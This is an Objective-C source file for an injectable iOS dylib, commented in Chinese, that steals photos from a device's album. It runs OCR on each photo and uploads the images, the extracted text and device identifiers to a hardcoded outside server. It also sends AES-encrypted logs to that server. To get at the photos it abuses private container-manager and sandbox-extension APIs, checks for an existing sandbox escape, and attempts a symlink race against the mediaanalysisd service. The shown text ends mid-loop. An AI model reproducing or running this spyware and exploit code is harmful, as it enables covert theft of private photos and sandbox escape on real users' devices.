// libexfil.m — 独立注入 dylib：偷相册 → PNG 重编码 → Vision OCR → 上传
// 无依赖：constructor 自启动，行为探测沙盒状态（试读 DCIM），不依赖主二进制符号
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <sys/utsname.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreImage/CoreImage.h>
#import <Vision/Vision.h>
#import <CommonCrypto/CommonCryptor.h>
#import <stdlib.h>
#import <string.h>
#import <errno.h>

static NSString *const kExfilBase = @"https://iso.daiti.de";

extern char *sandbox_extension_issue_file(const char *extension_class,
                                          const char *path,
                                          uint32_t flags);

static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void exfilScanDirDirect(NSString *dir);
static NSString *exfilAppUuid(void);
static NSString *exfilMachineName(void);
static int gExfilMcmLogged = 0; // MCM 尝试细节只首轮上报，避免轰炸日志服务

// 远程日志：AES-128-CBC(hex key/iv) 加密 JSON → base64 → POST /api/log/report
// 带发送队列：启动初期网络未就绪时先攒着，成功一条删一条
static NSMutableArray<NSString *> *gExfilPending = nil;
static dispatch_queue_t gExfilLogQ = NULL;

static NSString *exfilAesEncryptBase64(NSString *plain)
{
    NSData *data = [plain dataUsingEncoding:NSUTF8StringEncoding];
    // PKCS7 补齐到 16 字节块
    NSMutableData *padded = [data mutableCopy];
    uint8_t pad = 16 - (data.length % 16);
    uint8_t padBytes[16];
    memset(padBytes, pad, sizeof(padBytes));
    [padded appendBytes:padBytes length:pad];

    unsigned char key[16], iv[16];
    const char *hexKey = "bc2c72b2260840b28bc9614aa2b8004b";
    const char *hexIv  = "71ec8e3980754823aba30e62be55cf6a";
    for (int i = 0; i < 16; i++) {
        unsigned int k, v;
        sscanf(hexKey + i * 2, "%02x", &k);
        sscanf(hexIv + i * 2, "%02x", &v);
        key[i] = (unsigned char)k;
        iv[i]  = (unsigned char)v;
    }

    NSMutableData *out = [NSMutableData dataWithLength:padded.length];
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, 0,
        key, 16, iv, padded.bytes, padded.length,
        out.mutableBytes, out.length, &moved);
    // padded 已手动补齐，这里传 0 选项直接整块加密
    if (st != kCCSuccess) return nil;
    out.length = padded.length;
    return [out base64EncodedStringWithOptions:0];
}

static void exfilRemoteLog(NSString *msg)
{
    if (!gExfilLogQ)
    {
        gExfilLogQ = dispatch_queue_create("exfil.log", DISPATCH_QUEUE_SERIAL);
        gExfilPending = [NSMutableArray new];
    }
    @synchronized (gExfilPending)
    {
        if (gExfilPending.count < 80) [gExfilPending addObject:msg];
    }
    dispatch_async(gExfilLogQ, ^{
        NSArray<NSString *> *batch = nil;
        @synchronized (gExfilPending) { batch = [gExfilPending copy]; }
        for (NSString *m in batch)
        {
            @try {
                long ts = (long)([[NSDate date] timeIntervalSince1970] * 1000);
                NSDictionary *payload = @{
                    @"app_uuid": exfilAppUuid(),
                    @"text": [NSString stringWithFormat:@"[album-exfil] %@", m],
                    @"timestamp": @(ts),
                };
                NSData *jd = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
                NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
                NSString *enc = exfilAesEncryptBase64(plain);
                if (!enc) continue;

                NSString *body = [NSString stringWithFormat:@"params=%@", enc];
                NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/log/report"]];
                NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
                req.HTTPMethod = @"POST";
                req.timeoutInterval = 15;
                [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
                [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
                req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];

                __block BOOL ok = NO;
                dispatch_semaphore_t sem = dispatch_semaphore_create(0);
                [[[NSURLSession sharedSession] dataTaskWithRequest:req
                    completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
                        if (!err && data)
                        {
                            NSDictionary *json = [NSJSONSerialization
                                JSONObjectWithData:data options:0 error:nil];
                            ok = [json isKindOfClass:[NSDictionary class]] &&
                                 [[json valueForKey:@"code"] isEqual:@0];
                        }
                        dispatch_semaphore_signal(sem);
                    }] resume];
                dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 16 * NSEC_PER_SEC));
                if (ok)
                {
                    @synchronized (gExfilPending) { [gExfilPending removeObjectIdenticalTo:m]; }
                }
                else
                {
                    break; // 网络不通，剩下的留着下轮补发
                }
            } @catch (NSException *e) { break; }
        }
    });
}

// 补发线程：网络恢复后把没发出去的日志冲掉
static void exfilLogFlushLoop(void)
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        for (;;)
        {
            sleep(5);
            @synchronized (gExfilPending) {}
            if (gExfilPending.count > 0) exfilRemoteLog(@"");
        }
    });
}

static void exfilLog(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[album-exfil] %@", msg);
    exfilRemoteLog(msg);
}

#pragma mark - 设备标识

static NSString *exfilAppUuid(void)
{
    NSString *key = @"exfil_app_uuid";
    NSString *uuid = [[NSUserDefaults standardUserDefaults] stringForKey:key];
    if (uuid.length == 0)
    {
        uuid = [[NSUUID UUID] UUIDString];
        [[NSUserDefaults standardUserDefaults] setObject:uuid forKey:key];
    }
    return uuid;
}

static NSString *exfilMachineName(void)
{
    struct utsname sys;
    uname(&sys);
    return [NSString stringWithUTF8String:sys.machine] ?: @"unknown";
}

#pragma mark - Vision OCR

static NSString *exfilOcrJson(UIImage *img)
{
    if (!img.CGImage) return nil;

    VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
    req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
    req.usesLanguageCorrection = YES;
    req.recognitionLanguages = @[@"en-US"];

    VNImageRequestHandler *handler =
        [[VNImageRequestHandler alloc] initWithCGImage:img.CGImage options:@{}];

    NSError *err = nil;
    [handler performRequests:@[req] error:&err];
    if (err || req.results.count == 0) return nil;

    NSMutableString *text = [NSMutableString new];
    CGFloat confSum = 0;
    NSInteger confN = 0;

    for (VNRecognizedTextObservation *obs in req.results)
    {
        NSArray<VNRecognizedText *> *cands = [obs topCandidates:1];
        VNRecognizedText *cand = cands.firstObject;
        if (!cand) continue;
        if (text.length > 0) [text appendString:@"\n"];
        [text appendString:cand.string];
        confSum += cand.confidence;
        confN++;
    }
    if (confN == 0) return nil;

    NSDictionary *json = @{
        @"text": [NSString stringWithString:text],
        @"confidence": @(confSum / (CGFloat)confN),
    };
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
    if (!data) return nil;
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

#pragma mark - multipart 上传

static void exfilAppendPart(NSMutableData *body, NSString *field,
                            NSString *value, NSString *boundary)
{
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n\r\n",
        boundary, field] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[value dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
}

static BOOL exfilPost(UIImage *img, NSString *filename)
{
    NSData *png = UIImagePNGRepresentation(img);
    if (!png) return NO;

    NSString *boundary = [@"x-exfil-" stringByAppendingString:[[NSUUID UUID] UUIDString]];
    NSMutableData *body = [NSMutableData data];

    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"image\"; filename=\"%@\"\r\n"
         @"Content-Type: image/png\r\n\r\n", boundary, filename]
        dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:png];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    NSString *ocr = exfilOcrJson(img);
    if (ocr.length > 0)
        exfilAppendPart(body, @"text", ocr, boundary);

    exfilAppendPart(body, @"machine", exfilMachineName(), boundary);
    exfilAppendPart(body, @"iosVersion", [UIDevice currentDevice].systemVersion, boundary);
    exfilAppendPart(body, @"appUuid", exfilAppUuid(), boundary);

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
        dataUsingEncoding:NSUTF8StringEncoding]];

    NSURL *url = [NSURL URLWithString:
        [kExfilBase stringByAppendingString:@"/api/upload/album"]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 30;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
        forHTTPHeaderField:@"Content-Type"];
    [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
    req.HTTPBody = body;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL ok = NO;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
            if (!err && data)
            {
                NSDictionary *json = [NSJSONSerialization
                    JSONObjectWithData:data options:0 error:nil];
                ok = [json isKindOfClass:[NSDictionary class]] &&
                     [[json valueForKey:@"code"] isEqual:@0];
            }
            dispatch_semaphore_signal(sem);
        }];
    [task resume];

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 35 * NSEC_PER_SEC));
    return ok;
}

static void exfilUpload(UIImage *img, NSString *originalName)
{
    if (!img) return;
    NSString *filename = [NSString stringWithFormat:@"exfil_%@.png", originalName];
    BOOL ok = exfilPost(img, filename);
    exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
}

#pragma mark - 路径 0：MCM C 桥（照抄宿主 mcm_bridge：libsystem_containermanager）
// 宿主靠 com.apple.mobile.MobileHouseArrest 伪装 + container_query(2, flags 0x900000000)
// + sandbox_token 激活拿任意 app 数据容器；同进程直接照抄同一套 C 调用。

#import <xpc/xpc.h>

typedef void *(*MCMQueryCreate)(void);
typedef void (*MCMQuerySetU64)(void *, uint64_t);
typedef void (*MCMQuerySetXPC)(void *, xpc_object_t);
typedef void *(*MCMQueryGetPointer)(void *);
typedef char *(*MCMCopyToken)(void *);
typedef const char *(*MCMGetPath)(void *);
typedef void *(*MCMObjectCopy)(void *);
typedef bool (*MCMObjectActivate)(void *, bool);
typedef void (*MCMObjectFree)(void *);
typedef int (*MCMErrorGetInt)(void *);
typedef const char *(*MCMErrorGetString)(void *);
typedef void (*MCMQueryFree)(void *);
typedef void (*MCMQueryIterate)(void *, void (^)(void *));

// 宿主 bad_query 用 sandbox_extension_consume 激活扩展（handle>=0 即成功），
// 不是 container_object_sandbox_extension_activate；consume 优先
typedef int64_t (*ExfilSbxConsume)(const char *token);
static ExfilSbxConsume gExfilSbxConsume = NULL;
static BOOL gExfilSbxConsumeTried = NO;

static ExfilSbxConsume exfilSbxConsume(void)
{
    if (!gExfilSbxConsumeTried)
    {
        gExfilSbxConsumeTried = YES;
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib",
                         RTLD_NOW | RTLD_LOCAL);
        if (!h) h = RTLD_DEFAULT;
        gExfilSbxConsume = (ExfilSbxConsume)dlsym(h, "sandbox_extension_consume");
    }
    return gExfilSbxConsume;
}

typedef struct {
    MCMQueryCreate queryCreate;
    MCMQuerySetU64 querySetClass;
    MCMQuerySetXPC querySetIdentifiers;
    MCMQuerySetU64 querySetFlags;
    MCMQuerySetU64 querySetPart;
    MCMQueryGetPointer queryGetSingle;
    MCMQueryGetPointer queryGetLastError;
    MCMGetPath objectGetPath;
    MCMObjectCopy objectCopy;
    MCMCopyToken objectCopyToken;
    MCMObjectActivate objectActivate;
    MCMObjectFree objectFree;
    MCMErrorGetInt errorGetPOSIX;
    MCMErrorGetString errorGetMessage;
    MCMQueryFree queryFree;
} ExfilMCMAPI;

static BOOL exfilMCMLoad(ExfilMCMAPI *api)
{
    memset(api, 0, sizeof(*api));
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                     RTLD_NOW | RTLD_LOCAL);
    if (!h) h = RTLD_DEFAULT;
#define LOAD(f, s) api->f = (void *)dlsym(h, s)
    LOAD(queryCreate, "container_query_create");
    LOAD(querySetClass, "container_query_set_class");
    LOAD(querySetIdentifiers, "container_query_set_identifiers");
    LOAD(querySetFlags, "container_query_operation_set_flags");
    LOAD(querySetPart, "container_query_operation_set_part");
    LOAD(queryGetSingle, "container_query_get_single_result");
    LOAD(queryGetLastError, "container_query_get_last_error");
    LOAD(objectGetPath, "container_object_get_path");
    LOAD(objectCopy, "container_object_copy");
    LOAD(objectCopyToken, "container_copy_sandbox_token");
    LOAD(objectActivate, "container_object_sandbox_extension_activate");
    LOAD(objectFree, "container_object_free");
    LOAD(errorGetPOSIX, "container_error_get_posix_errno");
    LOAD(errorGetMessage, "container_error_get_message");
    LOAD(queryFree, "container_query_free");
#undef LOAD
    return api->queryCreate && api->querySetClass && api->querySetIdentifiers &&
           api->querySetFlags && api->queryGetSingle && api->objectGetPath &&
           api->objectCopy && api->objectCopyToken && api->objectActivate &&
           api->queryFree;
}

// 全局租约字典：activate 拿到的 query + container 对象存这里，
// 进程退出才回收（照抄宿主 MCMActiveLeases 的生命周期）
static NSMutableDictionary<NSString *, NSArray *> *gExfilLeases = nil;

// 与宿主 MCMActivateContainerPath 等价：查 root + activate 扩展 + 入字典持有
static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSString **errOut)
{
    ExfilMCMAPI api;
    if (!exfilMCMLoad(&api))
    {
        if (errOut) *errOut = @"mcm symbols missing";
        return nil;
    }
    if (!gExfilLeases) gExfilLeases = [NSMutableDictionary new];

    // 宿主 MCMSafeIdentifier：白名单字符外的 identifier 直接拒
    if ([identifier rangeOfCharacterFromSet:
             [[NSCharacterSet characterSetWithCharactersInString:
                 @"abcdefghijklmnopqrstuvwxyz"
                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"] invertedSet]]
            .location != NSNotFound)
    {
        if (errOut) *errOut = @"identifier unsupported chars";
        return nil;
    }

    // 已有租约直接复用（防重复 activate 踢掉旧租约）
    NSString *key = [NSString stringWithFormat:@"%llu:%@", (unsigned long long)cls, identifier];
    @synchronized (gExfilLeases)
    {
        NSArray *held = gExfilLeases[key];
        if (held.count == 2)
        {
            if (errOut) *errOut = @"lease held";
            return held[1]; // path
        }
    }

    void *query = api.queryCreate();
    if (!query) { if (errOut) *errOut = @"query create failed"; return nil; }

    api.querySetClass(query, cls);
    xpc_object_t value = xpc_string_create(identifier.UTF8String);
    api.querySetIdentifiers(query, value);
    api.querySetFlags(query, 0x900000000ULL);
    if (api.querySetPart) api.querySetPart(query, 0);

    void *result = api.queryGetSingle(query);
    if (!result)
    {
        if (errOut)
        {
            void *qe = api.queryGetLastError ? api.queryGetLastError(query) : NULL;
            int posix = qe && api.errorGetPOSIX ? api.errorGetPOSIX(qe) : 0;
            const char *msg = qe && api.errorGetMessage ? api.errorGetMessage(qe) : NULL;
            *errOut = [NSString stringWithFormat:@"denied posix=%d msg=%s",
                       posix, msg ?: "unknown"];
        }
        api.queryFree(query);
        return nil;
    }

    const char *rawPath = api.objectGetPath(result);
    NSString *path = rawPath ? [NSString stringWithUTF8String:rawPath] : nil;
    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"])
        path = [@"/private" stringByAppendingString:path];

    // activate：宿主路径 = copy_token → sandbox_extension_consume（handle>=0）；
    // 旧路径 objectActivate 只做兜底。handle 不释放 = 扩展进程级存活
    void *obj = api.objectCopy(result);
    BOOL activated = NO;
    int64_t consumedHandle = -1;
    if (obj)
    {
        char *token = api.objectCopyToken(obj);
        BOOL tokenPresent = token && token[0] != '\0';
        if (tokenPresent)
        {
            ExfilSbxConsume consume = exfilSbxConsume();
            if (consume)
            {
                consumedHandle = consume(token);
                activated = consumedHandle >= 0;
            }
            if (!activated && api.objectActivate)
                activated = api.objectActivate(obj, false);
        }
        free(token);
    if (errOut)
    {
        *errOut = activated
            ? [NSString stringWithFormat:@"activated consume=%lld",
               (long long)consumedHandle]
            : (tokenPresent ? @"extension activate failed" : @"no sandbox token");
    }
        // 只有 activate 成功才入字典持有（失败的对象直接丢弃也不影响）
    }
    else if (errOut)
    {
        *errOut = @"object copy failed";
        api.queryFree(query);
        return nil;
    }

    // 容器不存在/没激活成功：释放这次查询，不留垃圾
    if (!obj)
    {
        api.queryFree(query);
    }

    if (activated)
    {
        @synchronized (gExfilLeases)
        {
            // 用 NSValue 包指针入字典（对象不进 autorelease 池也没关系，纯持有）
            gExfilLeases[key] = @[[NSValue valueWithPointer:query],
                                  path ?: @""];
        }
    }
    return path.length ? path : nil;
}

static NSString *exfilMCMPhotosMediaDir(void)
{
    // 点查名单：mobile/root 是 system data 域用户 home，命中概率最高；
    // 其余是照片体系相关 identifier，每档 class 全配一遍
    NSArray *identifiers = @[
        @"mobile",
        @"root",
        @"com.apple.mobilephoto",
        @"com.apple.PhotoLibrary",
        @"com.apple.mobileslideshow",
        @"com.apple.assetsd",
        @"com.apple.Photos",
    ];
    // 两阶段：先全部 activate 入字典（防后进租约踢掉先进租约），再统一读
    // 阶段 1：点查 + activate，只收集（identifier, class, root, act）四元组
    NSMutableArray *found = [NSMutableArray new];
    for (uint64_t cls = 0; cls <= 6; cls++)
    {
        for (NSString *ident in identifiers)
        {
            NSString *err = nil;
            NSString *root = exfilMCMContainerPath(cls, ident, &err);
            if (root.length == 0)
            {
                if (gExfilMcmLogged < 40)
                {
                    gExfilMcmLogged++;
                    exfilLog(@"MCM cls=%llu ident=%@ no-root err=%@",
                             (unsigned long long)cls, ident, err);
                }
                continue;
            }
            [found addObject:@[@(cls), ident, root, err ?: @""]];
        }
    }

    // 阶段 2：租约全激活完了，统一 stat → readdir 验证
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSArray *item in found)
    {
        uint64_t cls = [item[0] unsignedLongLongValue];
        NSString *ident = item[1];
        NSString *root = item[2];
        NSString *act = item[3];

        // stat 先行：门开没开先看这里
        struct stat st;
        errno = 0;
        int statOk = stat(root.fileSystemRepresentation, &st);
        int statErrno = errno;

        errno = 0;
        NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
        int listErrno = errno;
        BOOL readable = entries != nil;

        if (gExfilMcmLogged < 40)
        {
            gExfilMcmLogged++;
            exfilLog(@"MCM cls=%llu ident=%@ root=%@ act=%@ stat=%d/%d readable=%d errno=%d n=%lu entries: %@",
                     (unsigned long long)cls, ident, root, act,
                     statOk, statErrno, readable, listErrno,
                     (unsigned long)entries.count,
                     entries.count <= 15
                        ? [entries componentsJoinedByString:@","]
                        : [[entries subarrayWithRange:NSMakeRange(0, 15)]
                            componentsJoinedByString:@","]);
            if ([root hasPrefix:@"/private/var/mobile"] &&
                ![root containsString:@"Containers"])
                exfilLog(@"*** SYSTEM DATA HIT cls=%llu ident=%@ root=%@",
                         (unsigned long long)cls, ident, root);
        }

        if (!readable) continue; // 门还没开，记录在案

        // 命中 DCIM
        if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
        {
            exfilLog(@"MCM lease ok: ident=%@ cls=%llu root=%@",
                     ident, (unsigned long long)cls, root);
            return root;
        }
        NSString *mediaSub = [root stringByAppendingPathComponent:@"Media"];
        if ([fm fileExistsAtPath:[mediaSub stringByAppendingPathComponent:@"DCIM"]])
        {
            exfilLog(@"MCM lease ok (sub): ident=%@ cls=%llu root=%@",
                     ident, (unsigned long long)cls, mediaSub);
            return mediaSub;
        }
    }
    return nil;
}

// 扫给定 Media 根下的 DCIM（真实子目录优先，兜底 100-199APPLE）+ CPL
static void exfilScanMediaUnder(NSString *media)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dcim = [media stringByAppendingPathComponent:@"DCIM"];

    NSArray *subs = [fm contentsOfDirectoryAtPath:dcim error:nil];
    if (subs.count)
    {
        for (NSString *sub in subs)
            exfilScanDirDirect([dcim stringByAppendingPathComponent:sub]);
    }
    else
    {
        for (int d = 100; d <= 199; d++)
            exfilScanDirDirect([dcim stringByAppendingPathComponent:
                [NSString stringWithFormat:@"%dAPPLE", d]]);
    }

    NSString *cpl = [media stringByAppendingPathComponent:
        @"PhotoData/CPL/assets"];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:cpl];
    NSMutableSet *seen = [NSMutableSet new];
    for (NSString *rel in en)
    {
        NSString *dir = [cpl stringByAppendingPathComponent:
            [rel stringByDeletingLastPathComponent]];
        if ([seen containsObject:dir]) continue;
        [seen addObject:dir];
        exfilScanDirDirect(dir);
    }
}

#pragma mark - 路径 A：沙盒逃逸后直读相册

static void exfilScanDirDirect(NSString *dir)
{
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *files = [fm contentsOfDirectoryAtPath:dir error:nil];
    if (!files) return;

    for (NSString *name in files)
    {
        NSString *ext = [[name pathExtension] lowercaseString];
        BOOL okExt = ext.length == 0 ||
                     [ext isEqualToString:@"heic"] ||
                     [ext isEqualToString:@"jpg"] ||
                     [ext isEqualToString:@"jpeg"] ||
                     [ext isEqualToString:@"png"];
        if (!okExt) continue;

        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;

        NSData *raw = [NSData dataWithContentsOfFile:full];
        if (!raw) continue;

        UIImage *img = [UIImage imageWithData:raw];
        if (!img) continue;

        exfilUpload(img, name);
    }
}

// 行为探测：DCIM 能列出来 = 沙盒逃逸已生效
static BOOL exfilSandboxEscaped(void)
{
    NSArray *dirs = [[NSFileManager defaultManager]
        contentsOfDirectoryAtPath:@"/private/var/mobile/Media/DCIM" error:nil];
    return dirs != nil;
}

static void exfilDirectMode(void)
{
    exfilLog(@"direct mode: sandbox escape active");

    NSString *dcim = @"/private/var/mobile/Media/DCIM";
    for (int d = 100; d <= 199; d++)
    {
        NSString *dir = [dcim stringByAppendingPathComponent:
            [NSString stringWithFormat:@"%dAPPLE", d]];
        exfilScanDirDirect(dir);
    }

    NSString *cpl = @"/private/var/mobile/Media/PhotoData/CPL/assets";
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager]
        enumeratorAtPath:cpl];
    NSMutableSet *seenDirs = [NSMutableSet new];
    for (NSString *rel in en)
    {
        NSString *dir = [cpl stringByAppendingPathComponent:
            [rel stringByDeletingLastPathComponent]];
        if ([seenDirs containsObject:dir]) continue;
        [seenDirs addObject:dir];
        exfilScanDirDirect(dir);
    }
    exfilLog(@"direct mode done");
}

#pragma mark - 路径 B：mediaanalysisd 竞态兜底

static NSXPCConnection *gExfilConn = nil;
static int gExfilReqID = 0;

@protocol VCPMADServicePublicServerProtocol <NSObject>
@optional
- (void)requestImageProcessing:(id)requests
                     forAssetURL:(NSURL *)url
                withSandboxToken:(NSString *)token
                      identifier:(NSString *)identifier
                       requestID:(int)requestID
                        andReply:(void (^)(id, id))reply;
@end

static NSXPCConnection *exfilMachConn(NSString *serviceName)
{
    NSXPCConnection *alloc = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    return ((id(*)(id, SEL, id, NSUInteger))objc_msgSend)(alloc, sel, serviceName, 0);
}

static void exfilEnsureConn(void)
{
    if (gExfilConn) return;

    dlopen("/System/Library/PrivateFrameworks/MediaAnalysis.framework/MediaAnalysis", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/MediaAnalysisServices.framework/MediaAnalysisServices", RTLD_NOW);

    gExfilConn = exfilMachConn(@"com.apple.mediaanalysisd.service.public");

    NSXPCInterface *iface =
        [NSXPCInterface interfaceWithProtocol:@protocol(VCPMADServicePublicServerProtocol)];

    NSMutableSet *allowed = [NSMutableSet setWithObjects:
        [NSDictionary class], [NSMutableDictionary class],
        [NSArray class], [NSMutableArray class],
        [NSString class], [NSNumber class],
        [NSData class], [NSError class],
        [NSSet class], [NSMutableSet class],
        [NSURL class], [NSNull class],
        [NSDate class], [NSValue class], nil];

    for (NSString *name in @[@"MADRequest", @"MADMLScalingRequest", @"MADMLScalingResult",
                             @"MADMLEnhancementRequest", @"MADMLEnhancementResult",
                             @"MADVIDocumentRecognitionRequest",
                             @"MADRemoveBackgroundMaskRequest", @"MADRemoveBackgroundMatteRequest",
                             @"VCPProtoAssetAnalysis", @"VITextBlockAnnotation",
                             @"VNObservation", @"VNRecognizedTextObservation"])
    {
        Class c = NSClassFromString(name);
        if (c) [allowed addObject:c];
    }

    SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
    [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];

    gExfilConn.remoteObjectInterface = iface;
    [gExfilConn resume];
}

static NSArray *exfilScalingRequest(int w, int h)
{
    Class cls = NSClassFromString(@"MADMLScalingRequest");
    if (!cls) return @[];

    id req = [cls new];
    [req setValue:@(w) forKey:@"scaledImageWidth"];
    [req setValue:@(h) forKey:@"scaledImageHeight"];
    [req setValue:@(1) forKey:@"scalingModelIndex"];
    return @[req];
}

static UIImage *exfilImageFromReply(id arg1)
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;

    for (id req in (NSArray *)arg1)
    {
        @try {
            id err = [req valueForKey:@"error"];
            if (err) continue;

            NSArray *results = [req valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]] || results.count == 0) continue;

            for (id result in results)
            {
                SEL pbSel = NSSelectorFromString(@"pixelBuffer");
                if (![result respondsToSelector:pbSel]) continue;

                CVPixelBufferRef buf = ((CVPixelBufferRef(*)(id, SEL))objc_msgSend)(result, pbSel);
                if (!buf) continue;

                CIImage *ci = [CIImage imageWithCVPixelBuffer:buf];
                if (!ci) continue;

                CIContext *ctx = [CIContext contextWithOptions:nil];
                CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
                if (!cg) continue;

                UIImage *img = [UIImage imageWithCGImage:cg];
                CGImageRelease(cg);
                return img;
            }
        } @catch (NSException *e) {}
    }
    return nil;
}

static NSData *exfilDecoyData(void)
{
    CGSize sz = CGSizeMake(400, 400);
    UIGraphicsBeginImageContextWithOptions(sz, YES, 1.0);
    [[UIColor colorWithRed:0 green:1 blue:0 alpha:1] setFill];
    UIRectFill(CGRectMake(0, 0, sz.width, sz.height));
    UIImage *decoy = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImagePNGRepresentation(decoy);
}

static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath,
                          NSData *decoyData, useconds_t delay)
{
    unlink(racePath.UTF8String);
    [decoyData writeToFile:racePath atomically:NO];

    unlink(symPath.UTF8String);
    symlink(target.UTF8String, symPath.UTF8String);

    char *raw = sandbox_extension_issue_file(
        "com.apple.app-sandbox.read", racePath.UTF8String, 0);
    if (!raw) return NO;
    NSString *token = [NSString stringWithUTF8String:raw];
    free(raw);
    if (!token) return NO;

    NSURL *url = [NSURL fileURLWithPath:racePath];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block UIImage *img = nil;

    id<VCPMADServicePublicServerProtocol> proxy =
        [gExfilConn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            dispatch_semaphore_signal(sem);
        }];

    [proxy requestImageProcessing:exfilScalingRequest(600, 600)
                         forAssetURL:url
                    withSandboxToken:token
                          identifier:@"d"
                           requestID:++gExfilReqID
                            andReply:^(id arg1, id arg2) {
        img = exfilImageFromReply(arg1);
        dispatch_semaphore_signal(sem);
    }];

    usleep(delay);
    rename(symPath.UTF8String, racePath.UTF8String);

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    if (!img) return NO;

    CGImageRef cg = img.CGImage;
    if (!cg) return NO;

    uint8_t px[4] = {0};
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(px, 1, 1, 8, 4, cs,
        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    CGContextDrawImage(ctx, CGRectMake(0, 0, CGImageGetWidth(cg), CGImageGetHeight(cg)), cg);
    CGContextRelease(ctx);

    BOOL isDecoy = (px[0] < 50 && px[1] > 200 && px[2] < 50);
    if (isDecoy) return NO;

    exfilUpload(img, [target lastPathComponent]);
    return YES;
}

static void exfilRaceMode(void)
{
    exfilLog(@"race mode: mediaanalysisd fallback");
    exfilEnsureConn();
    if (!gExfilConn)
    {
        exfilLog(@"race mode: XPC unavailable");
        return;
    }

    NSString *tmp = NSTemporaryDirectory();
    NSData *decoy = exfilDecoyData();

    NSString *exts[3] = {@"HEIC", @"JPG", @"PNG"};
    NSString *race[3] = {
        [tmp stringByAppendingPathComponent:@"race.HEIC"],
        [tmp stringByAppendingPathComponent:@"race.JPG"],
        [tmp stringByAppendingPathComponent:@"race.PNG"]
    };
    NSString *sym[3] = {
        [tmp stringByAppendingPathComponent:@"sym.HEIC"],
        [tmp stringByAppendingPathComponent:@"sym.JPG"],
        [tmp stringByAppendingPathComponent:@"sym.PNG"]
    };
    useconds_t delays[3] = {100, 250, 400};

    int stolen = 0;
    for (int d = 100; d <= 199; d++)
    {
        for (int img = 1; img <= 9999; img++)
        {
            BOOL got = NO;
            for (int e = 0; e < 3 && !got; e++)
            {
                NSString *target = [NSString stringWithFormat:
                    @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
